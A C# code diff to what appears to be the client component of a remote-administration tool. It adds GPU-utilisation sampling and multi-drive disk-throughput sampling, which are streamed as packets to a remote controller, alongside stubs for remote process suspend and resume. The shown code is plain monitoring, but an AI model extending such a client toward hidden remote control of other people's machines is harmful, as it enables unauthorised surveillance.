@@ -988,6 +988,14 @@ internal class TlsClient : IDisposable
     private static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
     [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, IntPtr lpInBuffer, uint nInBufferSize, IntPtr lpOutBuffer, uint nOutBufferSize, out uint lpBytesReturned, IntPtr lpOverlapped);
+    [System.Runtime.InteropServices.DllImport("pdh.dll")]
+    private static extern int PdhOpenQuery(IntPtr src, IntPtr ud, out IntPtr q);
+    [System.Runtime.InteropServices.DllImport("pdh.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
+    private static extern int PdhAddEnglishCounterW(IntPtr q, string path, IntPtr ud, out IntPtr c);
+    [System.Runtime.InteropServices.DllImport("pdh.dll")]
+    private static extern int PdhCollectQueryData(IntPtr q);
+    [System.Runtime.InteropServices.DllImport("pdh.dll")]
+    private static extern int PdhGetFormattedCounterArrayW(IntPtr c, uint fmt, ref int sz, out int cnt, IntPtr buf);
 
     private long _lastIdle, _lastKernel, _lastUser;
     private float SampleCpu()
@@ -1124,41 +1132,104 @@ internal class TlsClient : IDisposable
     {
         try
         {
-            // PhysicalDrive0 requires GENERIC_READ which needs admin rights.
-            // Fall back to \\.\C: (volume handle) which works unprivileged and
-            // also supports IOCTL_DISK_PERFORMANCE on most Windows versions.
-            var h = CreateFileW(@"\\.\PhysicalDrive0", GENERIC_READ, FILE_SHARE_RW, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
-            if (h == INVALID_HANDLE)
-                h = CreateFileW(@"\\.\C:", GENERIC_READ, FILE_SHARE_RW, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
-            if (h == INVALID_HANDLE) return (0, 0);
+            long totalRead = 0, totalWrite = 0;
+            bool gotAny = false;
+            var buf = System.Runtime.InteropServices.Marshal.AllocHGlobal(96);
             try
             {
-                const int bufSize = 96;
-                var buf = System.Runtime.InteropServices.Marshal.AllocHGlobal(bufSize);
-                try
+                // Aggregate all physical drives (stops at first gap in numbering)
+                for (int d = 0; d < 8; d++)
                 {
-                    if (!DeviceIoControl(h, IOCTL_DISK_PERFORMANCE, IntPtr.Zero, 0, buf, bufSize, out _, IntPtr.Zero)) return (0, 0);
-                    long bytesRead    = System.Runtime.InteropServices.Marshal.ReadInt64(buf, 0);
-                    long bytesWritten = System.Runtime.InteropServices.Marshal.ReadInt64(buf, 8);
-                    var now = DateTime.UtcNow;
-                    // Prime on first call to avoid (bytes-since-boot / elapsed) spike
-                    if (!_diskPrimed)
+                    var h = CreateFileW($@"\\.\PhysicalDrive{d}", GENERIC_READ, FILE_SHARE_RW, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
+                    if (h == INVALID_HANDLE) break;
+                    try
                     {
-                        _lastDiskRead = bytesRead; _lastDiskWrite = bytesWritten; _lastDiskTs = now;
-                        _diskPrimed = true;
-                        return (0, 0);
+                        if (DeviceIoControl(h, IOCTL_DISK_PERFORMANCE, IntPtr.Zero, 0, buf, 96, out _, IntPtr.Zero))
+                        {
+                            totalRead  += System.Runtime.InteropServices.Marshal.ReadInt64(buf, 0);
+                            totalWrite += System.Runtime.InteropServices.Marshal.ReadInt64(buf, 8);
+                            gotAny = true;
+                        }
                     }
-                    double elapsed = (now - _lastDiskTs).TotalSeconds;
-                    long readKBps  = elapsed > 0 ? (long)((bytesRead    - _lastDiskRead)  / elapsed / 1024) : 0;
-                    long writeKBps = elapsed > 0 ? (long)((bytesWritten - _lastDiskWrite) / elapsed / 1024) : 0;
-                    _lastDiskRead = bytesRead; _lastDiskWrite = bytesWritten; _lastDiskTs = now;
-                    return (Math.Max(0, readKBps), Math.Max(0, writeKBps));
+                    finally { CloseHandle(h); }
                 }
-                finally { System.Runtime.InteropServices.Marshal.FreeHGlobal(buf); }
+                // Fall back to volume C: if physical drives require admin rights
+                if (!gotAny)
+                {
+                    var h = CreateFileW(@"\\.\C:", GENERIC_READ, FILE_SHARE_RW, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
+                    if (h != INVALID_HANDLE)
+                    {
+                        try
+                        {
+                            if (DeviceIoControl(h, IOCTL_DISK_PERFORMANCE, IntPtr.Zero, 0, buf, 96, out _, IntPtr.Zero))
+                            {
+                                totalRead  = System.Runtime.InteropServices.Marshal.ReadInt64(buf, 0);
+                                totalWrite = System.Runtime.InteropServices.Marshal.ReadInt64(buf, 8);
+                                gotAny = true;
+                            }
+                        }
+                        finally { CloseHandle(h); }
+                    }
+                }
             }
-            finally { CloseHandle(h); }
+            finally { System.Runtime.InteropServices.Marshal.FreeHGlobal(buf); }
+
+            if (!gotAny) return (0, 0);
+            var now = DateTime.UtcNow;
+            if (!_diskPrimed)
+            {
+                _lastDiskRead = totalRead; _lastDiskWrite = totalWrite; _lastDiskTs = now;
+                _diskPrimed = true;
+                return (0, 0);
+            }
+            double elapsed = (now - _lastDiskTs).TotalSeconds;
+            long readKBps  = elapsed > 0 ? (long)((totalRead  - _lastDiskRead)  / elapsed / 1024) : 0;
+            long writeKBps = elapsed > 0 ? (long)((totalWrite - _lastDiskWrite) / elapsed / 1024) : 0;
+            _lastDiskRead = totalRead; _lastDiskWrite = totalWrite; _lastDiskTs = now;
+            return (Math.Max(0, readKBps), Math.Max(0, writeKBps));
         }
         catch { return (0, 0); }
+    }
+
+    // GPU utilization via PDH counter \GPU Engine(*engtype_3D)\Utilization Percentage
+    // Returns 0-100 (sum of all 3D engine instances, clamped), or -1 if unavailable.
+    private IntPtr _gpuQuery  = IntPtr.Zero;
+    private IntPtr _gpuCtr    = IntPtr.Zero;
+
+    private float SampleGpuPct()
+    {
+        try
+        {
+            if (_gpuQuery == IntPtr.Zero)
+            {
+                if (PdhOpenQuery(IntPtr.Zero, IntPtr.Zero, out _gpuQuery) != 0) { _gpuQuery = IntPtr.Zero; return -1f; }
+                if (PdhAddEnglishCounterW(_gpuQuery, @"\GPU Engine(*engtype_3D)\Utilization Percentage", IntPtr.Zero, out _gpuCtr) != 0)
+                { _gpuQuery = IntPtr.Zero; return -1f; }
+                PdhCollectQueryData(_gpuQuery); // baseline collection; rate counters need two samples
+                return 0f;
+            }
+            PdhCollectQueryData(_gpuQuery);
+            int sz = 0, cnt = 0;
+            const uint PDH_FMT_DOUBLE = 0x200;
+            PdhGetFormattedCounterArrayW(_gpuCtr, PDH_FMT_DOUBLE, ref sz, out _, IntPtr.Zero);
+            if (sz <= 0) return 0f;
+            var buf = System.Runtime.InteropServices.Marshal.AllocHGlobal(sz);
+            try
+            {
+                if (PdhGetFormattedCounterArrayW(_gpuCtr, PDH_FMT_DOUBLE, ref sz, out cnt, buf) != 0) return 0f;
+                // PDH_FMT_COUNTERVALUE_ITEM_W layout (64-bit): szName ptr (8) + CStatus (4) + pad (4) + doubleValue (8) = 24 bytes
+                double total = 0;
+                for (int i = 0; i < cnt; i++)
+                {
+                    int status = System.Runtime.InteropServices.Marshal.ReadInt32(buf, i * 24 + 8);
+                    if (status == 0)
+                        total += BitConverter.Int64BitsToDouble(System.Runtime.InteropServices.Marshal.ReadInt64(buf, i * 24 + 16));
+                }
+                return (float)Math.Min(100.0, total);
+            }
+            finally { System.Runtime.InteropServices.Marshal.FreeHGlobal(buf); }
+        }
+        catch { return -1f; }
     }
 
     // ── PerfMon streaming ────────────────────────────────────────────────────
@@ -1177,6 +1248,7 @@ internal class TlsClient : IDisposable
                 var hw  = SampleHardware(cpu);
                 var (sent, recv)   = SampleNetwork();
                 var (diskR, diskW) = SampleDisk();
+                var gpuPct = SampleGpuPct();
                 var data = JsonSerializer.Serialize(new PerfMonDataStub
                 {
                     CpuUsage      = hw.CpuUsage,
@@ -1188,6 +1260,7 @@ internal class TlsClient : IDisposable
                     DiskWriteKBps = diskW,
                     CpuName       = hw.CpuName,
                     GpuName       = hw.GpuName,
+                    GpuUsage      = gpuPct,
                 }, SeroJson.Default.PerfMonDataStub);
                 await WritePacketAsync(new Packet { Type = PacketType.PerfMonData, Data = data }, CancellationToken.None);
             }
@@ -2492,7 +2565,7 @@ internal class CdpSignupResultStub  { public bool Success { get; set; } public s
 // ── Hardware Stats + PerfMon ─────────────────────────
 internal class HardwareStatsStub { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } public string CpuName { get; set; } = ""; public string GpuName { get; set; } = ""; public int IdleSeconds { get; set; } }
 internal class PerfMonStartStub  { public int IntervalMs { get; set; } = 1000; }
-internal class PerfMonDataStub   { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } public long NetworkSentKB { get; set; } public long NetworkRecvKB { get; set; } public long DiskReadKBps { get; set; } public long DiskWriteKBps { get; set; } public string CpuName { get; set; } = ""; public string GpuName { get; set; } = ""; }
+internal class PerfMonDataStub   { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } public long NetworkSentKB { get; set; } public long NetworkRecvKB { get; set; } public long DiskReadKBps { get; set; } public long DiskWriteKBps { get; set; } public string CpuName { get; set; } = ""; public string GpuName { get; set; } = ""; public float GpuUsage { get; set; } = -1f; }
 
 // ── Process Manager extended ──────────────────────────
 internal class ProcSuspendResumeStub { public int Pid { get; set; } }
